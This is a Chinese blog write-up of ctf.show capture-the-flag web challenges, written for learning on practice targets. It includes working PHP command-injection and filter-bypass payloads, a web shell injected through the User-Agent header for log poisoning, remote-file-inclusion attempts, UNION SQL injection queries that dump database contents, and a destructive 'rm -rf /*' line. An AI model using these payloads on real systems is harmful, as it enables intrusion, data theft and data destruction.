<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ctf.show 刷题记录 | 可惜没如果、m0nk3y‘s Blog</title><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="萌新计划web1 ~7参考wp: https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41617034&#x2F;article&#x2F;details&#x2F;105249339 难度: 如果不知道就特难, 知道了就是秒杀, 所以做点基础题也是有好处的, 因为很多自己觉得是基础的东西, 或许反而不知道 考点:  MySql处理数据和php intval 函数的一些特性  intval函数可以用0x 16进制绕过 mysql">
<meta property="og:type" content="article">
<meta property="og:title" content="ctf.show 刷题记录">
<meta property="og:url" content="https://hack-for.fun/ecb0.html">
<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
<meta property="og:description" content="萌新计划web1 ~7参考wp: https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41617034&#x2F;article&#x2F;details&#x2F;105249339 难度: 如果不知道就特难, 知道了就是秒杀, 所以做点基础题也是有好处的, 因为很多自己觉得是基础的东西, 或许反而不知道 考点:  MySql处理数据和php intval 函数的一些特性  intval函数可以用0x 16进制绕过 mysql">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hack-for.fun/null">
<meta property="article:published_time" content="2020-04-12T04:13:09.000Z">
<meta property="article:modified_time" content="2020-08-25T08:45:18.802Z">
<meta property="article:author" content="m0nk3y">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hack-for.fun/null"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hack-for.fun/ecb0"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2020-08-25 16:45:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">可惜没如果、m0nk3y‘s Blog</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">ctf.show 刷题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-04-12T04:13:09.000Z" title="Created 2020-04-12 12:13:09">2020-04-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-25T08:45:18.802Z" title="Updated 2020-08-25 16:45:18">2020-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="萌新计划"><a href="#萌新计划" class="headerlink" title="萌新计划"></a>萌新计划</h1><h2 id="web1-7"><a href="#web1-7" class="headerlink" title="web1 ~7"></a>web1 ~7</h2><p>参考wp: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/105249339">https://blog.csdn.net/qq_41617034/article/details/105249339</a></p>
<p>难度: 如果不知道就特难, 知道了就是秒杀, 所以做点基础题也是有好处的, 因为很多自己觉得是基础的东西, 或许反而不知道</p>
<p>考点: </p>
<p>MySql处理数据和php intval 函数的一些特性</p>
<ul>
<li>intval函数可以用<code>0x</code> 16进制绕过</li>
<li>mysql 中 ‘1000’,”1000”, 与 1000 是一样的</li>
<li>位运算符中的 &lt;&lt; 左移运算符也可以用来绕过</li>
<li>位运算符中的 | 按位或也可以用于绕过</li>
<li>同理, 按位异或 ^ 也可以,. 其他也可以</li>
<li>取反 ~~1000  在数据库查询的时候也会转换为10进制数1000</li>
<li>mysql中 <code>0b</code> 二进制数在处理时也会转换位10进制数</li>
<li>数学运算, 注意url编码</li>
</ul>
<p>使用到的工具: </p>
<p>进制转换: <a target="_blank" rel="noopener" href="http://www.bejson.com/convert/jinzhi/">http://www.bejson.com/convert/jinzhi/</a></p>
<p>Mysql shell</p>
<h2 id="web8-15"><a href="#web8-15" class="headerlink" title="web8~15"></a>web8~15</h2><p>web8: <code>flag=rm -rf /*</code></p>
<p>web9: <code>system(&#39;cat config.php&#39;)</code></p>
<p>web10: <code>passthru(&#39;cat config.php&#39;);</code> </p>
<p>相关的函数可参考: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.passthru.php">https://www.php.net/manual/zh/function.passthru.php</a></p>
<p>web11: 过滤了cat, ca\t 即可绕过</p>
<p>web12: 过滤了<code>cat config php \</code>   , tac 代替cat即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;passthru(&#39;tac &#96;ls&#96;&#39;);</span><br></pre></td></tr></table></figure>

<p>web13:  <strong>过滤了<code>;</code> 通过<code>?&gt;</code> 来进行闭合</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;passthru(&#39;tac &#96;ls&#96;&#39;)?&gt;</span><br></pre></td></tr></table></figure>

<p>或者使用<code>assert</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;assert(base64_decode(&#39;c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp&#39;))?&gt;</span><br></pre></td></tr></table></figure>

<p>web14:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>新增过滤<code>()</code></p>
<p>巧用通配符即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac con*&#96;?&gt;</span><br></pre></td></tr></table></figure>

<p>web15:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,$c))</span><br></pre></td></tr></table></figure>

<p>过滤了<code>?</code> 那么<code>?&gt;</code> 就不能用了, 但是这里漏掉了<code>;</code>  这里<code>\\*</code> 是在过滤通配符? 正则上感觉不是,但是题目上就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?c&#x3D;echo &#96;$_POST[1]&#96;;</span><br><span class="line">post: 1&#x3D;cat config.php</span><br></pre></td></tr></table></figure>

<p>使用火狐浏览器的hackbar, 用Google好像不行</p>
<h2 id="web16-20"><a href="#web16-20" class="headerlink" title="web16~20"></a>web16~20</h2><p>web16:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> str1:</span><br><span class="line">            s = hashlib.md5((<span class="string">&#x27;ctfshow&#x27;</span>+i+j+k).encode()).hexdigest()</span><br><span class="line">            <span class="comment">#print(type(s))</span></span><br><span class="line">            <span class="keyword">if</span> s==<span class="string">&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;</span>:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure>

<p>web17: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>,$c))&#123;</span><br><span class="line">               <span class="keyword">include</span>($c);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一眼, 过滤了<code>php</code> 那么就不能通过php 伪协议进行文件包含了, 但是在尝试远程文件包含的时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(): http:&#x2F;&#x2F; wrapper is disabled in the server configuration by allow_url_include&#x3D;0 in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 5</span><br><span class="line"></span><br><span class="line">Warning: include(http:&#x2F;&#x2F;129.21.....&#x2F;shell.txt): failed to open stream: no suitable wrapper could be found in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 5</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#39;http:&#x2F;&#x2F;129.2.......&#x2F;ctf&#x2F;shell.txt&#39; for inclusion (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#39;) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 5</span><br></pre></td></tr></table></figure>

<p>发现是被禁用了, 测试了一下data这些也是</p>
<p>正解是 <strong>日志文件包含一句话getshell</strong></p>
<p>ai, 漏洞还是学的太浅了, 这个都没有一点印象, 日志文件包含getshell的话, 需要双on, 并且还要知道日志文件存放的目录</p>
<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;&lt;?php eval($_POST[1]);?&gt; (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.163 Safari&#x2F;537.36</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?c&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>

<p>web18 和 web19 都可以用日志包含getshell, 应该算是非预期了 太sao了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php|file|base/i&quot;</span>,$c))&#123;</span><br><span class="line">               <span class="keyword">include</span>($c);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>web18 通过源码可以知道,出题人应该是想让我们用file + base编码来绕过</p>
<p>web19 把base 给ban掉了</p>
<p>web20: ban掉了rot, 那么web19 估计是通过rot编码来绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php|file|base|rot/i&quot;</span>,$c))&#123;</span><br><span class="line">               <span class="keyword">include</span>($c);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>web21: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php|file|\:|base|rot/i&quot;</span>,$c))&#123;</span><br><span class="line">               <span class="keyword">include</span>($c);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤了<code>:</code> </p>
<p>依然可以用日志包含, 知道了这个点,可以 一路非预期, 但是预期解也要知道思路</p>
<p>web22: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\:|\/|\\\/i&quot;</span>,$c))&#123;</span><br><span class="line">               <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里会在文件名后面拼接<code>.php</code> 用<code>%00</code> 截断可以, 不过RFI 也没有打成功, 日志包含也不行了</p>
<p>因为这里过滤掉了<code>/</code> RFI打不成功也是因为过滤掉了<code>: 和 /</code></p>
<p>估计这里想考的就是<code>%00</code> 截断</p>
<h2 id="获得百分之百的快乐"><a href="#获得百分之百的快乐" class="headerlink" title="获得百分之百的快乐"></a><strong>获得百分之百的快乐</strong></h2><p>不知道是什么注入, 也不报错也不回显结果? 盲注?</p>
<p>web23, 24 都是条件竞争, 因为这里用了时间戳设计所以这里只能上脚本,脚本? </p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><ul>
<li>基本的SQL注入</li>
<li>多表联合查询</li>
</ul>
<p>查数据库名称</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 union select 1,database(),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>查数据库表的数量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 union select 1,(select count(*) from information_schema.tables where table_schema &#x3D; &#39;web2&#39;),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>查表的名字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 union select 1,(select table_name from information_schema.tables where table_schema &#x3D; &#39;web2&#39; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>第一个表的名字为:<code>flag</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 union select 1,(select table_name from information_schema.tables where table_schema &#x3D; &#39;web2&#39; limit 1,2),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>第二个表为user</p>
<p>查列的数量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 union select 1,(select count(*) from information_schema.columns where table_name &#x3D; &#39;flag&#39; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>查列的名字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 union select 1,(select column_name from information_schema.columns where table_name &#x3D; &#39;flag&#39; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>查flag表列记录的数量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 union select 1,(select count(*) from flag),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>查flag表记录值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($_GET[<span class="string">&#x27;url&#x27;</span>]);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>RFI getshell 蚁剑连得flag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>同样的方法再来一遍</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    $v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($v1) &amp;&amp; <span class="keyword">isset</span>($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!ctype_alpha($v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(md5($v1)==md5($v2))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>这里<code>ctype_alpha</code> 用于做纯字符检测, 找两个md5 后是 0e + 数字的即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><ul>
<li>fuzz 测试,发现只过滤空格</li>
</ul>
<p>order by 4 没回显, 3 有回显, 说明有3个字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3#&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<p>判断回显位, 回显为2 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3#&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<p>查询数据库中的表</p>
